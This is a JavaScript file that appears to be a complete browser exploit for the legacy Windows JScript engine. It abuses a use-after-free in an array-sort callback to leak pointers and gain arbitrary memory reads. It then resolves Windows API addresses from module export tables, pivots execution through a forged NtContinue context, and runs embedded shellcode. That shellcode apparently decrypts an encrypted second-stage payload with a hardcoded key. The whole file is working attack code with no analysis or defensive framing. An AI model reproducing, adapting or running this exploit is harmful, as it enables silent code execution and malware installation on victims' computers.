var uV;
var sA = new Array();
var eD;
var sp;
var ol;
var olB;
var va;
var spS = 20000;
var olS = 20000;
var lVP;
var lI;
var cV;
for (i = 0; i < 200; i++) {
    sA[i] = [0, 0];
}

function expl(untracked1, untracked2) {
    untracked1 = sp[eD * 2];
    untracked2 = sp[eD * 2 + 1];
    if (eD > 150) {
        sp = new Array();
        // CollectGarbage();
    } else {
        eD++;
        try {
            sA[eD].sort(expl);
        } catch (ex) {
            sp = new Array();
            // CollectGarbage();
        }
    }
    uV.push(untracked1);
    uV.push(untracked2);
    return 0;
}

function ruEx(vari) {
    va = vari;
    eD = 0;
    sp = new Array();
    ol = new Array();
    uV = new Array();
    for (i = 0; i < olS; i++) {
        ol[i] = new Object();
    }
    for (i = 0; i < spS; i++) {
        sp[i] = new Object();
    }
    // CollectGarbage();
    sA[0].sort(expl);
    for (i = 0; i < olS; i++) {
        ol[i][va] = 1;
        ol[i]["AAAAAAAAAAA"] = 1;
        ol[i]["\u0005"] = 1;
        ol[i]["value"] = i;
    }
}

function i2a(value) {
    var lower = value;
    if (lower < 0) {
        lower = lower + 0x100000000;
    }
    return {
        low: lower,
        high: (value - lower) / 0x100000000
    };
}

function ovrw(propName, value) {
    // CollectGarbage();
    olB[lI] = null;
    // CollectGarbage();
    olB[lI] = new Object();
    olB[lI][va] = 1;
    olB[lI]["AAAAAAAAAAA"] = 1;
    olB[lI]["\u0005"] = 1;
    olB[lI][propName] = value;
}

function addP(addr, value32) {
    try{
        var higher = addr.high;
        var lower = (addr.low + value32);

        if (lower > 0xFFFFFFFF) {
            higher += (lower >> 32) & 0xFFFFFFFF;
            lower = lower & 0xFFFFFFFF;
        }
        return {
            low: lower,
            high: higher
        };
    }catch{

    }
}

function crVa(type, objPtr) {
    return String.fromCharCode(type & 0xFFFF) + "\u0000\u0000\u0000" + a2s(objPtr) + "\u0000\u0000\u0000\u0000";
}

function readU8(addr, oO) {
    if (addr.low == 0 && addr.high == 0) {
        return 0;
    }
    ovrw(crVa(8, addP(addr, 3)), oO);
    return ((cV.length * 2) >> 8) & 0xff;
}

function readU16(addr, oO) {
    return readU8(addr, oO) | (readU8(addP(addr, 1), oO) << 8);
}

function readU32(addr, oO) {
    return readU16(addr, oO) | (readU16(addP(addr, 2), oO) << 16);
}

function readU64(addr, oO) {
    return {
        low: readU32(addr, oO),
        high: readU32(addP(addr, 4), oO)
    };
}

function readBS(addr) {
    tmp = "";
    off = 0;
    while (off < 128) {
        tmpValue = readU8(addP(addr, off));
        if (tmpValue == 0) break;
        tmp += String.fromCharCode(tmpValue);
        off++;
    }
    return tmp;
}

function o2a(strObj) {
    return readU64(addP(readU64(addP(lVP, 8), strObj), 8));
}

function a2s(addrObj) {
    try{
        return String.fromCharCode(addrObj.low & 0xFFFF) + String.fromCharCode((addrObj.low >> 16) & 0xFFFF) + String.fromCharCode(addrObj.high & 0xFFFF) + String.fromCharCode((addrObj.high >> 16) & 0xFFFF);
    }
    catch{


    }
}

function a2b(addr) {
    res = {
        low: addr.low & 0xFFFF0000,
        high: addr.high
    };
    while (readU32(addP(res, 0x6C)) != 0x20534f44) {
        res.low = res.low - 0x10000;
    }
    return res;
}

function iterMo(modAd) {
    moO = new Object();
    moO["base"] = modAd;
    e_lfanew = addP(modAd, readU32(addP(modAd, 0x3C)));
    exT = readU32(addP(e_lfanew, 0x88));
    if (exT != 0) {
        exT = addP(modAd, exT);
        exTSize = readU32(addP(exT, 0x18));
        moO["exT"] = exT;
        moO["exTSize"] = exTSize;
        exTN = addP(modAd, readU32(addP(exT, 0x20)));
        exTO = addP(modAd, readU32(addP(exT, 0x24)));
        exTA = addP(modAd, readU32(addP(exT, 0x1C)));
        moO["exTN"] = exTN;
        moO["exTO"] = exTO;
        moO["exTA"] = exTA;
    }
    imTa = readU32(addP(e_lfanew, 0x90));
    imTaS = readU32(addP(e_lfanew, 0x94));
    if (imTa != 0 && imTaS > 0) {
        imTa = addP(modAd, imTa);
    }
    moO["imTa"] = imTa;
    moO["imTaS"] = imTaS;
    return moO;
}

function getBaseByImport(moO, moNa) {
    for (i = 0; i < moO["imTaS"]; i += 0x14) {
        imNa = readU32(addP(addP(moO["imTa"], i), 0xC));
        if (imNa == 0) continue;
        imNa = readBS(addP(moO["base"], imNa));
        thP = addP(addP(moO["base"], readU32(addP(addP(moO["imTa"], i), 0x10))), 8 * 1);
        thV = readU64(thP);
        if (imNa.toLowerCase() == moNa.toLowerCase()) {
            return a2b(thV);
        }
    }
}

function chEx(moO, imNa, chId) {
    exNa = readU32(addP(moO["exTN"], 4 * chId));
    if (exNa == 0) return false;
    exNa = addP(moO["base"], exNa);
    cId = 0;
    for (i = 0; i < imNa.length; i++) {
        rB = String.fromCharCode(readU8(addP(exNa, i)));
        if (rB != imNa[i]) {
            return imNa[i] <= rB;
        }
        cId++;
    }
    return true;
}

function gEx(moO, imNa) {
    lP = 0;
    hP = moO["exTSize"];
    while (lP < hP) {
        m = Math.floor((lP + hP) / 2);
        if (chEx(moO, imNa, m)) {
            hP = m;
        } else {
            lP = m + 1;
        }
    }
    exNa = readU32(addP(moO["exTN"], 4 * lP));
    if (exNa == 0) return;
    exNa = readBS(addP(moO["base"], exNa));
    exOr = readU16(addP(moO["exTO"], 2 * lP));
    exAd = addP(moO["base"], readU32(addP(moO["exTA"], 4 * exOr)));
    return exAd;
}

function mNTCD(lRSO, cRSP, pivA, scA, scS, sWA) {
    return "\u0000\u0000\u0000\u0000" + "\u0000\u0000\u0000\u0000" + "\u0000\u0000\u0000\u0000" + "\u0000\u0000\u0000\u0000" + "\u0003\u0010" + "\u0000\u0000" + "\u0033" + "\u0000" + "\u0000" + "\u0000" + "\u0000" + "\u002b" + "\u0246\u0000" + "\u0000\u0000\u0000\u0000" + "\u0000\u0000\u0000\u0000" + "\u0000\u0000\u0000\u0000" + "\u0000\u0000\u0000\u0000" + "\u0000\u0000\u0000\u0000" + "\u0000\u0000\u0000\u0000" + "\u0000\u0000\u0000\u0000" + a2s(scA) + a2s(scS) + "\u0000\u0000\u0000\u0000" + a2s(lRSO) + "\u0000\u0000\u0000\u0000" + "\u0000\u0000\u0000\u0000" + "\u0000\u0000\u0000\u0000" + "\u0040\u0000\u0000\u0000" + a2s(sWA) + "\u0000\u0000\u0000\u0000" + a2s(cRSP) + "\u0000\u0000\u0000\u0000" + "\u0000\u0000\u0000\u0000" + "\u0000\u0000\u0000\u0000" + "\u0000\u0000\u0000\u0000" + a2s(pivA);
}

function execute(oba, ctx) {
    console.log(crVa(0x81, addP(lVP, 0x60)) + crVa(0, addP(oba, 2 * (3000))) + ctx)
    ovrw(crVa(0x81, addP(lVP, 0x60)) + crVa(0, addP(oba, 2 * (3000))) + ctx, 0);
    typeof cV;
}

function fpiv(stp) {
    off = 0x2da + 1;
    while (off < 0x300) {
        if (readU32(addP(stp, off)) == -0x3c1c74b7) {
            break;
        }
        off++;
    }
    if (off == 0x300) {
        return null;
    }
    return addP(stp, off);
}

function main() {
    
    ruEx(Array(0x23a).join('\u1234'))
    olB = ol;
    lVP = undefined;
    for (i = 0; i < uV.length; i++) {
        if (typeof uV[i] === "number" && uV[i] % 1 != 0) {
            lVP = i2a(uV[i] / 4.9406564584124654E-324);
            break;
        }
    }
    va = "AAAAAAAA";
    for (i = 0; i < 46; i++) {
        va += crVa(0x80, lVP);
    }
    while (va.length < 0x239) va = va + "A";
    ruEx(va);
    for (i = 0; i < uV.length; i++) {
        if (typeof uV[i] === "number") {
            lI = parseInt(uV[i] + "");
            verifyVariable = uV[i];
            break;
        }
    }
    ovrw("value", 9999);
    // if (verifyVariable + "" != 9999) {
    //     return false;
    // }
    ovrw(crVa(3, i2a(0xBEEF)), 0);
    va = "AAAAAAAA";
    for (i = 0; i < 46; i++) {
        va += crVa(0x80, addP(lVP, 64));
    }
    while (va.length < 0x239) va = va + "A";
    ruEx(va);
    for (i = 0; i < uV.length; i++) {
        if (typeof uV[i] === "number") {
            if (uV[i] + "" == 0xBEEF) {
                cV = uV[i];
                break;
            }
        }
    }
    ovrw(crVa(3, i2a(9999)), 0);
    if (cV + "" != 9999) {
        return false;
    }
    if (readU32(addP(lVP, 64)) != 8) {
        return false;
    }
    JO = new Object();
    JOA = o2a(JO);
    JOVT = readU64(JOA);
    JOSL = addP(readU64(addP(readU64(addP(JOA, 0x18)), 0x50)), 8);
    JSB = a2b(JOVT);
    JM = iterMo(JSB);
    MM = iterMo(getBaseByImport(JM, "msvcrt.dll"));
    KM = iterMo(getBaseByImport(JM, "kernel32.dll"));
    NM = iterMo(getBaseByImport(MM, "ntdll.dll"));
    NTCA = gEx(NM, "NtContinue");
    VPA = gEx(KM, "VirtualProtect");
    LLA = gEx(KM, "LoadLibraryA");
    GPAA = gEx(KM, "GetProcAddress");
    ThfA = gEx(MM, "tanhf");
    oFVT = Array(3000 + 1).join('A');
    oFVT = oFVT + Array(157).join('A') + a2s(NTCA);
    oFVT = oFVT.substr(0, oFVT.length);
    oFVT = o2a(oFVT);
    scS = "\u10EB";
    scS += a2s(LLA);
    scS += a2s(GPAA);
    scS += "\u4855\uE589\u8348\u50EC\u8B48\uE105\uFFFF\u48FF\u4589\u48B0\u058B\uFFDE\uFFFF\u8948\uB845\u8348\u20EC\u0DEB\u656B\u6E72\u6C65\u3233\u642E\u6C6C\u4800\u0D8D\uFFEC\uFFFF\u55FF\u48B0\uC483\u4820\uC389\u8348\u20EC\u8948\uEBD9\u560D\u7269\u7574\u6C61\u6C41\u6F6C\u0063\u8D48\uEC15\uFFFF\uFFFF\uB855\u8348\u20C4\u8948\uC045\u8348\u20EC\u8948\uEBD9\u560F\u7269\u7574\u6C61\u7250\u746F\u6365\u0074\u8D48\uEA15\uFFFF\uFFFF\uB855\u8348\u20C4\u8948\uC845\u8348\u20EC\u0DEB\u6441\u6176\u6970\u3233\u642E\u6C6C\u4800\u0D8D\uFFEC\uFFFF\u55FF\u48B0\uC483\u4820\uC389\u8348\u20EC\u8948\uEBD9\u4315\u7972\u7470\u6341\u7571\u7269\u4365\u6E6F\u6574\u7478\u0041\u8D48\uE415\uFFFF\uFFFF\uB855\u8348\u20C4\u8948\uD045\u8348\u20EC\u8948\uEBD9\u430F\u7972\u7470\u6D49\u6F70\u7472\u654B\u0079\u8D48\uEA15\uFFFF\uFFFF\uB855\u8348\u20C4\u8948\uD845\u8348\u20EC\u8948\uEBD9\u430D\u7972\u7470\u6544\u7263\u7079\u0074\u8D48\uEC15\uFFFF\uFFFF\uB855\u8348\u20C4\u8948\uE045\u8D48\uE85D\u8348\u30EC\u8948\u48D9\uC2C7\u0000\u0000\u36EB\u694D\u7263\u736F\u666F\u2074\u6E45\u6168\u636E\u6465\u5220\u4153\u6120\u646E\u4120\u5345\u4320\u7972\u7470\u676F\u6172\u6870\u6369\u5020\u6F72\u6976\u6564\u0072\u8D4C\uC305\uFFFF\u49FF\uC1C7\u0018\u0000\uB848\u0000\uF000\u0000\u0000\u8948\u2444\uFF20\uD055\u8348\u30C4\u8B48\u481B\u7D8D\uEBF0\u082C\u0002\u1000\u0066\u2000\u0000\u5300\u4333\u3352\u5F54\u454B\u5F59\u4F44\u544E\u545F\u4C45\u5F4C\u4E41\u4F59\u454E\u2121\u2121\u4821\u358D\uFFCD\uFFFF\u8348\u30EC\u8948\u48D9\uF289\uC749\u2CC0\u0000\u4900\uC1C7\u0000\u0000\uC748\u2444\u0120\u0000\u4800\u7C89\u2824\u55FF\u48D8\uC483\u4C30\u278B\u8348\u20EC\uC748\u00C1\u0000\u4800\uC2C7\u1000\u0000\uC749\u00C0\u0010\u4900\uC1C7\u0004\u0000\u55FF\u48C0\uC483\u4820\uC789\u00E9\u0002\u9D00\u9D40\u951C\u8920\u89CB\uBBB0\u62A8\uBB37\uDC83\uAB37\u4D43\uCB7A\u78D1\u00C3\u56EC\u21C4\uE694\uAA36\u8495\uFF94\u6D00\u88F1\u6DB0\u07FA\u722F\u0EB7\u4BC7\uE328\u79B9\u30B0\u6B0C\uEA3C\uF0F6\uBD80\u2A32\u068E\u31F7\u181F\u4C2A\uACFC\u63E5\uF79D\u1536\u043E\uE1F0\u283B\u4C90\uA441\uBFE5\u633B\u7A6C\u0EE2\u584C\u5780\u09C0\uEDC8\uA003\u07F2\uFB86\uA13E\u1B6A\u5248\uE35E\u637B\uBD0D\u70AF\u362A\u00C9\uBF80\u4D79\uABD5\uAD98\u78EC\uE391\u13E4\uE2D8\uE3B2\u0E11\uB41E\uF979\uAB34\u593D\u4EB3\uB2FC\u0EC0\uB9FB\uD363\u3C43\u8610\u371D\uF43D\u7F76\uCEFF\u9FC4\u3180\u6920\uAB86\uB450\uBC15\uDEB2\u31B2\u3D0C\u4FBB\u649E\uE581\u082A\u42AE\uB4E9\uB0C6\u8007\u0F6A\u94D1\u0DD2\u86C8\uF642\uAA58\u9A79\uC8AA\u79B4\uC363\u04E0\u16B5\u47C3\u9F3B\uB229\u0FCE\u232C\u57DA\u7172\u6BCC\u506D\u9E06\u984C\u1EE6\uDACC\u3A6E\u2665\uCD06\u833F\u9C25\u959A\u21D0\uD340\uE50C\u11F1\u6839\uA2FD\uE0FC\u2917\u82CD\uB763\u0095\u6869\uFB0A\uE639\u2D30\u755E\u094C\uD7F0\u3A91\u6A1E\u9249\uC049\u2438\u55BF\u6900\u4CB3\u0B17\uA659\u218C\u7D9E\u7EFE\u2EDD\u769E\uB3FE\uD043\u3847\u553A\uBA0C\u7C38\uB882\uF44C\uA988\u9322\uC4A8\u6A4B\uC09C\u5CD5\uB093\u9FD5\uB2A5\u945A\u55CE\uB841\u7F5F\u6615\u162B\u41FE\uA7DE\uF53B\u5A33\uB426\uDA43\u9D5F\uA8A5\u7C39\u4CA8\u9D99\u17B5\u601D\u17C7\uD912\u840B\u2546\u8B7F\uBB28\uAFA8\u8160\uC353\uF8E9\u77B8\uEADD\uE823\u8199\u6C04\uB1E5\uB586\u6794\u8FD3\u0833\uB802\u16F0\u3517\uB8E7\u75A5\uEA9E\u1F1C\u29B4\u2737\u6AD0\u2E57\u7CC3\u8513\uF745\uB101\u2845\uF684\u0269\uC731\u6B22\u26B1\uE37F\uB0C9\u89F9\uDB08\u188A\u48DA\uC1C7\u0200\u0000\u8D48\uF235\uFFFD\uF3FF\u48A4\uC789\u8D48\uF85D\u03C7\u0200\u0000\u8348\u30EC\u894C\u48E1\uC2C7\u0000\u0000\uC749\u01C0\u0000\u4900\uC1C7\u0000\u0000\u8948\u247C\u4820\u5C89\u2824\u55FF\u48E0\uC483\u4830\u5D8D\u48F8\uEC83\u4820\uF989\uC748\u00C2\u0010\u4900\uC0C7\u0020\u0000\u8949\uFFD9\uC855\u8348\u20C4\u8B48\uB04D\u8B48\uB855\uD7FF\uC3C9\u0000\u0000";
    scS = scS.substr(0, scS.length);
    scA = o2a(scS);
    nSS = Array(0x100000 + 1).join('\u0101');
    nSS += a2s(VPA);
    nSS += a2s(scA);
    nSS = nSS.substr(0, nSS.length);
    nSA = addP(o2a(nSS), ((nSS.length * 2) - 0x10));
    sV = "";
    sV += a2s(i2a(0));
    sV = sV.substr(0, sV.length);
    sVA = o2a(sV);
    piv = fpiv(ThfA);
    ctx = mNTCD(JOSL, nSA, piv, scA, i2a(scS.length * 2), sVA);
    execute(oFVT, ctx);
}
main();